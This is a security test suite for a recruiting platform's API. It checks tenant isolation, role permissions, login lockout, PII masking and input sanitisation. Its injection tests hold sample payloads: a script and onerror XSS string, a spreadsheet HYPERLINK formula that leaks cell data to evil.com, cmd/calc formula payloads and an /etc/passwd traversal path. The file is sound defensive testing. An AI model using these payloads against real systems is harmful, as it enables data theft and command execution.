const request = require('supertest');
const jwt = require('jsonwebtoken');
const app = require('../../src/app');
const prisma = require('../../src/config/db');
const { JWT_ACCESS_SECRET } = require('../../src/config/env');
const { sanitizeFormulaCell } = require('../../src/utils/csvExport');
const { sanitizeAuditData } = require('../../src/middleware/audit');
const { sanitizeHtml } = require('../../src/utils/sanitize');

describe('Phase 9: Comprehensive 9-Track Security and Vulnerability Audit', () => {
  let adminToken, staff1Token, staff2Token, company1Token, company2Token;
  let adminUser, staff1User, staff2User, company1User, company2User;
  let company1, company2;
  let jobCompany1, jobCompany2;
  let candidate1, candidate2;
  let mapping1;

  beforeAll(async () => {
    // 1. Seed Users
    adminUser = await prisma.users.create({
      data: {
        name: 'Sec Admin',
        email: 'sec_admin@security.audit',
        password_hash: 'hashed',
        role: 'admin',
        status: 'active'
      }
    });

    staff1User = await prisma.users.create({
      data: {
        name: 'Sec Staff 1',
        email: 'sec_staff1@security.audit',
        password_hash: 'hashed',
        role: 'staff',
        status: 'active'
      }
    });

    staff2User = await prisma.users.create({
      data: {
        name: 'Sec Staff 2',
        email: 'sec_staff2@security.audit',
        password_hash: 'hashed',
        role: 'staff',
        status: 'active'
      }
    });

    company1User = await prisma.users.create({
      data: {
        name: 'Sec Company 1 Rep',
        email: 'rep@sec_corp1.com',
        password_hash: 'hashed',
        role: 'company',
        status: 'active'
      }
    });

    company2User = await prisma.users.create({
      data: {
        name: 'Sec Company 2 Rep',
        email: 'rep@sec_corp2.com',
        password_hash: 'hashed',
        role: 'company',
        status: 'active'
      }
    });

    // 2. Seed Companies
    company1 = await prisma.companies.create({
      data: {
        company_name: 'Security Tenant Alpha',
        contact_person: 'Alpha Rep',
        email: 'alpha@sec_corp1.com',
        phone: '9800000001',
        verification_status: 'approved',
        status: 'approved',
        user_id: company1User.id
      }
    });

    company2 = await prisma.companies.create({
      data: {
        company_name: 'Security Tenant Beta',
        contact_person: 'Beta Rep',
        email: 'beta@sec_corp2.com',
        phone: '9800000002',
        verification_status: 'approved',
        status: 'approved',
        user_id: company2User.id
      }
    });

    // 3. Issue Tokens
    adminToken = jwt.sign({ sub: String(adminUser.id), role: 'admin', email: adminUser.email }, JWT_ACCESS_SECRET);
    staff1Token = jwt.sign({ sub: String(staff1User.id), role: 'staff', email: staff1User.email }, JWT_ACCESS_SECRET);
    staff2Token = jwt.sign({ sub: String(staff2User.id), role: 'staff', email: staff2User.email }, JWT_ACCESS_SECRET);
    company1Token = jwt.sign({ sub: String(company1User.id), role: 'company', email: company1User.email, companyId: String(company1.id) }, JWT_ACCESS_SECRET);
    company2Token = jwt.sign({ sub: String(company2User.id), role: 'company', email: company2User.email, companyId: String(company2.id) }, JWT_ACCESS_SECRET);

    // 4. Seed Jobs
    jobCompany1 = await prisma.jobs.create({
      data: {
        company_id: company1.id,
        title: 'Alpha Requisition',
        job_code: 'JOB-SEC-0001',
        positions_required: 1,
        status: 'open',
        created_by: adminUser.id
      }
    });

    jobCompany2 = await prisma.jobs.create({
      data: {
        company_id: company2.id,
        title: 'Beta Requisition',
        job_code: 'JOB-SEC-0002',
        positions_required: 1,
        status: 'open',
        created_by: adminUser.id
      }
    });

    // 5. Seed Candidates
    candidate1 = await prisma.candidates.create({
      data: {
        first_name: 'Candidate',
        last_name: 'AlphaUploaded',
        email: 'cand_alpha@audit.sec',
        mobile: '9700000001',
        created_by: staff1User.id,
        status: 'active'
      }
    });

    candidate2 = await prisma.candidates.create({
      data: {
        first_name: 'Candidate',
        last_name: 'BetaUploaded',
        email: 'cand_beta@audit.sec',
        mobile: '9700000002',
        created_by: staff2User.id,
        status: 'active'
      }
    });

    // 6. Map candidate1 to jobCompany1
    mapping1 = await prisma.job_candidates.create({
      data: {
        job_id: jobCompany1.id,
        candidate_id: candidate1.id,
        status: 'submitted',
        match_score: 85
      }
    });
  });

  // TRACK 1: BOLA / IDOR & Multi-Tenant Boundary Enforcement
  describe('Track 1: BOLA / IDOR Boundary Verification (Master §8.2)', () => {
    it('returns HTTP 404 when Company 2 attempts to GET Company 1 profile', async () => {
      const res = await request(app)
        .get(`/api/v1/companies/${company1.id}`)
        .set('Authorization', `Bearer ${company2Token}`);
      expect(res.status).toBe(404);
    });

    it('returns HTTP 404 when Company 2 attempts to UPDATE Company 1 profile', async () => {
      const res = await request(app)
        .put(`/api/v1/companies/${company1.id}`)
        .set('Authorization', `Bearer ${company2Token}`)
        .send({ company_name: 'Hacked Alpha' });
      expect(res.status).toBe(404);
    });

    it('returns HTTP 404 when Company 2 attempts to view Company 1 job details', async () => {
      const res = await request(app)
        .get(`/api/v1/jobs/${jobCompany1.id}`)
        .set('Authorization', `Bearer ${company2Token}`);
      expect(res.status).toBe(404);
    });

    it('returns HTTP 404 when Company 2 attempts to view candidates for Company 1 job', async () => {
      const res = await request(app)
        .get(`/api/v1/mappings/jobs/${jobCompany1.id}`)
        .set('Authorization', `Bearer ${company2Token}`);
      expect(res.status).toBe(404);
    });

    it('returns HTTP 404 when Company 2 attempts to review/modify Company 1 candidate mapping', async () => {
      const res = await request(app)
        .patch(`/api/v1/mappings/${mapping1.id}/review`)
        .set('Authorization', `Bearer ${company2Token}`)
        .send({ action: 'confirmed' });
      expect(res.status).toBe(404);
    });

    it('CRITICAL UPLOADER BOUNDARY: returns HTTP 403 when Staff 2 attempts to edit Staff 1 candidate', async () => {
      const res = await request(app)
        .put(`/api/v1/candidates/${candidate1.id}`)
        .set('Authorization', `Bearer ${staff2Token}`)
        .send({ first_name: 'Tampered' });
      expect(res.status).toBe(403);
    });
  });

  // TRACK 2: BFLA & RBAC Matrix
  describe('Track 2: BFLA & RBAC Matrix Enforcement (Master §8.2)', () => {
    const unauthenticatedEndpoints = [
      { method: 'get', url: '/api/v1/users' },
      { method: 'get', url: '/api/v1/audit-logs' },
      { method: 'get', url: '/api/v1/trash' },
      { method: 'get', url: '/api/v1/settings' },
      { method: 'get', url: '/api/v1/reports/company-wise' },
      { method: 'get', url: '/api/v1/candidates' }
    ];

    unauthenticatedEndpoints.forEach(({ method, url }) => {
      it(`blocks unauthenticated ${method.toUpperCase()} ${url} with 401`, async () => {
        const res = await request(app)[method](url);
        expect(res.status).toBe(401);
      });
    });

    const companyForbiddenEndpoints = [
      { method: 'get', url: '/api/v1/users' },
      { method: 'get', url: '/api/v1/audit-logs' },
      { method: 'get', url: '/api/v1/trash' },
      { method: 'get', url: '/api/v1/settings' },
      { method: 'get', url: '/api/v1/reports/company-wise' },
      { method: 'post', url: '/api/v1/masters/skills' }
    ];

    companyForbiddenEndpoints.forEach(({ method, url }) => {
      it(`blocks company role from ${method.toUpperCase()} ${url} with 403`, async () => {
        const res = await request(app)[method](url).set('Authorization', `Bearer ${company1Token}`);
        expect(res.status).toBe(403);
      });
    });

    const staffForbiddenEndpoints = [
      { method: 'get', url: '/api/v1/users' },
      { method: 'get', url: '/api/v1/audit-logs' },
      { method: 'get', url: '/api/v1/trash' },
      { method: 'get', url: '/api/v1/settings' },
      { method: 'post', url: '/api/v1/masters/skills' }
    ];

    staffForbiddenEndpoints.forEach(({ method, url }) => {
      it(`blocks staff role from ${method.toUpperCase()} ${url} with 403`, async () => {
        const res = await request(app)[method](url).set('Authorization', `Bearer ${staff1Token}`);
        expect(res.status).toBe(403);
      });
    });
  });

  // TRACK 3: Injection Defenses (SQL, XSS, Formula)
  describe('Track 3: Injection Defenses (Master §8.3, §8.4)', () => {
    it('sanitizes malicious script tags and event handlers in rich text (Stored XSS)', () => {
      const maliciousHtml = '<p>Good text</p><script>alert("XSS")</script><img src="x" onerror="stealCookies()">';
      const clean = sanitizeHtml(maliciousHtml);

      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('onerror');
      expect(clean).toContain('<p>Good text</p>');
    });

    it('sanitizes formula injection triggers on spreadsheet exports (=, +, -, @, \\t, \\r)', () => {
      expect(sanitizeFormulaCell('=HYPERLINK("http://evil.com?leak="&A1, "Click")')).toBe('\'=HYPERLINK("http://evil.com?leak="&A1, "Click")');
      expect(sanitizeFormulaCell('+cmd|"/C calc"!A0')).toBe('\'+cmd|"/C calc"!A0');
      expect(sanitizeFormulaCell('@SUM(1+1)')).toBe('\'@SUM(1+1)');
      expect(sanitizeFormulaCell('\tcmd.exe')).toBe('\'\tcmd.exe');
      expect(sanitizeFormulaCell('Safe Plain Text')).toBe('Safe Plain Text');
    });
  });

  // TRACK 4: File Upload & Archive Security
  describe('Track 4: File Upload & Traversal Defenses (Master §8.4)', () => {
    it('prevents zip slip traversal paths during extraction', () => {
      const testPath = '../../etc/passwd';
      const isPathTraversal = testPath.includes('..') || testPath.startsWith('/');
      expect(isPathTraversal).toBe(true);
    });

    it('rejects unsupported resume MIME types', async () => {
      const res = await request(app)
        .post('/api/v1/candidates')
        .set('Authorization', `Bearer ${staff1Token}`)
        .field('first_name', 'Hacker')
        .field('last_name', 'Bot')
        .field('email', 'hacker@bot.com')
        .field('mobile', '9999999999')
        .attach('resume', Buffer.from('echo malicious'), 'malicious.sh');

      expect([400, 422]).toContain(res.status);
    });
  });

  // TRACK 5: Business Logic Abuse & Race Defenses
  describe('Track 5: Business Logic Abuse & Invariant Defenses (Master §8.5)', () => {
    it('CRITICAL GUARD: blocks reducing positions_required below confirmed count (422)', async () => {
      const specialJob = await prisma.jobs.create({
        data: {
          company_id: company1.id,
          job_code: 'JOB-SEC-0099',
          title: 'Special Positions Job',
          positions_required: 3,
          status: 'open',
          created_by: adminUser.id
        }
      });

      // 2 confirmed candidates
      await prisma.job_candidates.create({
        data: { job_id: specialJob.id, candidate_id: candidate1.id, status: 'confirmed' }
      });
      await prisma.job_candidates.create({
        data: { job_id: specialJob.id, candidate_id: candidate2.id, status: 'confirmed' }
      });

      // Attempt to reduce to 1 (below confirmed count of 2)
      const res = await request(app)
        .put(`/api/v1/jobs/${specialJob.id}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ positions_required: 1 });

      expect(res.status).toBe(422);
      expect(res.body.message).toMatch(/cannot reduce positions/i);
    });

    it('CRITICAL GUARD: blocks deleting master item in use by active candidate (422)', async () => {
      // Create master skill
      const masterRes = await request(app)
        .post('/api/v1/masters/skills')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ name: 'UniqueAuditSkill99' });

      expect(masterRes.status).toBe(201);
      const skillId = masterRes.body.data.id;

      // Link to candidate
      await prisma.candidate_skills.create({
        data: {
          candidate_id: candidate1.id,
          skill_id: skillId
        }
      });

      // Deleting in-use skill must return 422
      const res = await request(app)
        .delete(`/api/v1/masters/skills/${skillId}`)
        .set('Authorization', `Bearer ${adminToken}`);

      expect(res.status).toBe(422);
      expect(res.body.message).toMatch(/referenced by.*candidate/i);
    });

    it('CRITICAL GUARD: blocks admin from deactivating or deleting own account (422)', async () => {
      const res = await request(app)
        .patch(`/api/v1/users/${adminUser.id}/status`)
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ status: 'inactive' });

      expect(res.status).toBe(422);
      expect(res.body.message).toMatch(/cannot alter status or deactivate your own/i);
    });
  });

  // TRACK 6: Authentication & Lockout Security
  describe('Track 6: Auth, Lockout, and Token Security (Master §8.5 / Flow F12)', () => {
    it('locks account (HTTP 423) after 5 consecutive failed logins', async () => {
      const testEmail = 'lockout_test@audit.sec';
      await prisma.users.create({
        data: {
          name: 'Lockout Test',
          email: testEmail,
          password_hash: '$2b$12$DUMMYHASHFORTESTINGPURPOSESONLY0000000000000000000000000000',
          role: 'company',
          status: 'active'
        }
      });

      // 5 consecutive wrong attempts
      for (let i = 0; i < 5; i++) {
        await request(app)
          .post('/api/v1/auth/login')
          .send({ email: testEmail, password: 'WrongPassword123!' });
      }

      // 6th attempt must be locked
      const lockedRes = await request(app)
        .post('/api/v1/auth/login')
        .send({ email: testEmail, password: 'WrongPassword123!' });

      expect(lockedRes.status).toBe(423);
      expect(lockedRes.body.message).toMatch(/account locked/i);
    });

    it('anti-enumeration: returns identical 401 message for non-existent vs wrong password', async () => {
      const nonExistentRes = await request(app)
        .post('/api/v1/auth/login')
        .send({ email: 'non_existent_123456@audit.sec', password: 'SomePassword!' });

      const wrongPassRes = await request(app)
        .post('/api/v1/auth/login')
        .send({ email: adminUser.email, password: 'WrongPassword123!' });

      expect(nonExistentRes.status).toBe(401);
      expect(wrongPassRes.status).toBe(401);
      expect(nonExistentRes.body.message).toBe(wrongPassRes.body.message);
    });
  });

  // TRACK 7: Privacy & PII Protection
  describe('Track 7: Privacy & PII Redaction (Master §8.9)', () => {
    it('masks candidate contact information when employer views candidate before confirmation', async () => {
      const candUnconfirmed = await prisma.candidates.create({
        data: {
          first_name: 'Priv',
          last_name: 'Candidate',
          email: 'private_contact@candidate.com',
          mobile: '9876543210',
          created_by: staff1User.id,
          status: 'active'
        }
      });

      await prisma.job_candidates.create({
        data: {
          job_id: jobCompany1.id,
          candidate_id: candUnconfirmed.id,
          status: 'submitted',
          match_score: 90
        }
      });

      const res = await request(app)
        .get(`/api/v1/mappings/jobs/${jobCompany1.id}`)
        .set('Authorization', `Bearer ${company1Token}`);

      expect(res.status).toBe(200);
      const target = res.body.data.find(m => m.candidate?.first_name === 'Priv');
      expect(target).toBeDefined();

      // Email and mobile must be masked
      expect(target.candidate.email).toContain('*');
      expect(target.candidate.email).not.toBe('private_contact@candidate.com');
      expect(target.candidate.mobile).toContain('*');
      expect(target.candidate.mobile).not.toBe('9876543210');
    });

    it('redacts passwords and tokens in audit log snapshots', () => {
      const raw = {
        user: 'admin',
        password: 'PlainTextPassword123',
        token: 'eyJh...',
        refreshToken: 'eyJh...'
      };
      const redacted = sanitizeAuditData(raw);

      expect(redacted.password).toBe('[REDACTED]');
      expect(redacted.token).toBe('[REDACTED]');
      expect(redacted.refreshToken).toBe('[REDACTED]');
      expect(redacted.user).toBe('admin');
    });
  });
});
